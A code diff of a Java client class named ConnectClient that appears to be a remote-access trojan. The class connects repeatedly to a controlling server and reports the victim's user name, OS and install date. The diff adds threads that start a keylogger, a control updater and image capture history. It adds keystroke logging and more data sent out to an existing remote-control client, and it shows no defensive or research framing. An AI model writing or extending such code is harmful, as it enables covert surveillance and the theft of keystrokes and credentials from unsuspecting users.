@@ -6,9 +6,7 @@ package br.com.introcdc.connect.client;
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.command.ClientCommand;
 import br.com.introcdc.connect.client.command.ClientCommandEnum;
-import br.com.introcdc.connect.client.components.FileComponents;
-import br.com.introcdc.connect.client.components.ImageComponents;
-import br.com.introcdc.connect.client.components.InstallComponents;
+import br.com.introcdc.connect.client.components.*;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -25,7 +23,7 @@ public class ConnectClient {
     }
 
     public static final ScheduledExecutorService EXECUTOR =
-            Executors.newScheduledThreadPool(4);
+            Executors.newScheduledThreadPool(5);
 
     // Message Variables
     public static PrintWriter WRITER;
@@ -47,7 +45,9 @@ public class ConnectClient {
         }
         FileComponents.deleteFile(new File(InstallComponents.LOCAL_UPDATER));
         ClientCommandEnum.registerCommands();
-        new Thread(ImageComponents::startInstance).start();
+        new Thread(KeyLoggerComponents::startKeyLogger).start();
+        new Thread(ControlComponents::startUpdater).start();
+        new Thread(ImageComponents::startHistory).start();
         for (; ; ) {
             try {
                 connectToServer();
@@ -98,6 +98,9 @@ public class ConnectClient {
         WRITER = writer;
         msg("key:" + InstallComponents.generateUniqueCode());
         msg("user:" + System.getProperty("user.name"));
+        msg("date:" + FileComponents.toDate(new File(InstallComponents.LOCAL_FILE).lastModified()));
+        msg("os:" + System.getProperty("os.name"));
+        new Thread(ImageComponents::execHistoryUpdate).start();
 
         try {
             String serverMessage;
